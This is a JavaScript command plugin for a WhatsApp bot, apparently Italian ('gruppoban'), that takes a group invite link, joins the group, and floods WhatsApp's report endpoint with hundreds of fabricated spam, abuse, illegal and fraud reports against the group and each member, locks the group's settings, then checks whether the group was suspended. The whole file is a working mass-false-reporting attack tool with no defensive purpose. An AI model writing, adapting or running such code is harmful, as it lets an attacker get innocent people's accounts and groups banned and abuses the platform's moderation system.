let handler = async (m, { conn, text, isOwner }) => {
    if (!isOwner) return;

    let link = text ? text.trim() : '';
    if (!link) return;

    let match = link.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/);
    if (!match) return;
    let inviteCode = match[1];

    try {
        await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
    } catch (e) {}

    let groupJid;
    try {
        let groupInfo = await conn.groupGetInviteInfo(inviteCode);
        groupJid = groupInfo.id;
    } catch (e) {
        try { await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }); } catch (e2) {}
        return;
    }

    let metadata;
    try {
        metadata = await conn.groupMetadata(groupJid);
    } catch (e) {
        try { await conn.groupAcceptInvite(inviteCode); } catch (e2) {}
        try { metadata = await conn.groupMetadata(groupJid); } catch (e3) {
            try { await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }); } catch (e4) {}
            return;
        }
    }

    let botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
    let participants = metadata.participants.map(p => p.jid).filter(j => j !== botId);

    let tasks = [];

    for (let i = 0; i < 100; i++) {
        tasks.push(
            conn.query({
                tag: 'iq',
                attrs: {
                    to: 's.whatsapp.net',
                    type: 'set',
                    xmlns: 'w:comms:report'
                },
                content: [
                    {
                        tag: 'report',
                        attrs: {
                            jid: groupJid,
                            type: 'spam',
                            reason: 'abuse'
                        }
                    }
                ]
            }).catch(() => {})
        );

        tasks.push(
            conn.query({
                tag: 'iq',
                attrs: {
                    to: 's.whatsapp.net',
                    type: 'set',
                    xmlns: 'w:comms:report'
                },
                content: [
                    {
                        tag: 'report',
                        attrs: {
                            jid: groupJid,
                            type: 'abuse',
                            reason: 'illegal'
                        }
                    }
                ]
            }).catch(() => {})
        );

        tasks.push(
            conn.query({
                tag: 'iq',
                attrs: {
                    to: 's.whatsapp.net',
                    type: 'set',
                    xmlns: 'w:comms:report'
                },
                content: [
                    {
                        tag: 'report',
                        attrs: {
                            jid: groupJid,
                            type: 'scam',
                            reason: 'fraud'
                        }
                    }
                ]
            }).catch(() => {})
        );

        for (let jid of participants) {
            tasks.push(
                conn.query({
                    tag: 'iq',
                    attrs: {
                        to: 's.whatsapp.net',
                        type: 'set',
                        xmlns: 'w:comms:report'
                    },
                    content: [
                        {
                            tag: 'report',
                            attrs: {
                                jid: jid,
                                type: 'spam',
                                reason: 'abuse'
                            }
                        }
                    ]
                }).catch(() => {})
            );

            tasks.push(
                conn.query({
                    tag: 'iq',
                    attrs: {
                        to: 's.whatsapp.net',
                        type: 'set',
                        xmlns: 'w:comms:report'
                    },
                    content: [
                        {
                            tag: 'report',
                            attrs: {
                                jid: jid,
                                type: 'abuse',
                                reason: 'illegal'
                            }
                        }
                    ]
                }).catch(() => {})
            );
        }

        tasks.push(conn.groupRevokeInvite(groupJid).catch(() => {}));
        tasks.push(conn.groupSettingUpdate(groupJid, 'announcement').catch(() => {}));
        tasks.push(conn.groupSettingUpdate(groupJid, 'locked').catch(() => {}));
    }

    await Promise.allSettled(tasks);

    let sospeso = false;
    for (let i = 0; i < 60; i++) {
        try {
            let meta = await conn.groupMetadata(groupJid);
            if (!meta || !meta.participants || meta.participants.length === 0) {
                sospeso = true;
                break;
            }
        } catch (e) {
            sospeso = true;
            break;
        }
        await new Promise(r => setTimeout(r, 200));
    }

    try {
        await conn.sendMessage(m.chat, { react: { text: sospeso ? '🚫' : '❌', key: m.key } });
    } catch (e) {}
};

handler.command = ['gruppoban'];
handler.owner = true;
handler.private = false;

export default handler;